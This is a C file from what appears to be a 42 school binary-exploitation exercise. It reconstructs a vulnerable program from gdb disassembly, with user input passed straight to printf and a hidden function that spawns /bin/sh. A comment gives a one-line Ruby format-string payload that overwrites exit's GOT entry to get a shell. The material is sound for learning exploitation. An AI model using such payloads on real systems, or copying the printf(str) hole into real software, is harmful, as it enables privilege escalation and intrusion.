/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   level5.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/04/14 19:30:44 by fcadet            #+#    #+#             */
/*   Updated: 2021/04/15 18:22:34 by fcadet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

//(gdb) disas main
//Dump of assembler code for function main:
//   0x08048504 <+0>:	push   %ebp
//   0x08048505 <+1>:	mov    %esp,%ebp
//   0x08048507 <+3>:	and    $0xfffffff0,%esp
//
//   0x0804850a <+6>:	call   0x80484c2 <n>
//
//   0x0804850f <+11>:	leave  
//   0x08048510 <+12>:	ret    
//End of assembler dump.
//(gdb) disas o
//Dump of assembler code for function o:
//   0x080484a4 <+0>:	push   %ebp
//   0x080484a5 <+1>:	mov    %esp,%ebp
//   0x080484a7 <+3>:	sub    $0x18,%esp
//
//   0x080484aa <+6>:	movl   $0x80485f0,(%esp) < "/bin/sh"
//   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
//
//   0x080484b6 <+18>:	movl   $0x1,(%esp) < 1
//   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
//End of assembler dump.
//(gdb) disas n
//Dump of assembler code for function n:
//   0x080484c2 <+0>:	push   %ebp
//   0x080484c3 <+1>:	mov    %esp,%ebp
//   0x080484c5 <+3>:	sub    $0x218,%esp
//
//   0x080484cb <+9>:	mov    0x8049848,%eax < stdin
//   0x080484d0 <+14>:	mov    %eax,0x8(%esp) < .
//   0x080484d4 <+18>:	movl   $0x200,0x4(%esp) < 512
//   0x080484dc <+26>:	lea    -0x208(%ebp),%eax < str
//   0x080484e2 <+32>:	mov    %eax,(%esp) < .
//   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
//
//   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
//   0x080484f0 <+46>:	mov    %eax,(%esp)
//   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
//
//   0x080484f8 <+54>:	movl   $0x1,(%esp)
//   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
//End of assembler dump.

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

// GOT's exit @ 0x08049838
// o @ 0x080484a4 = 134513828
//ruby -e 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"' > /tmp/exploit

void	o(void) {
	system("/bin/sh");
	exit(1);
}

void	n(void) {
	char	str[520];

	fgets(str, 512, stdin);
	printf(str);
	exit(1);
}

int		main(void) {
	n();
	return (0);
}
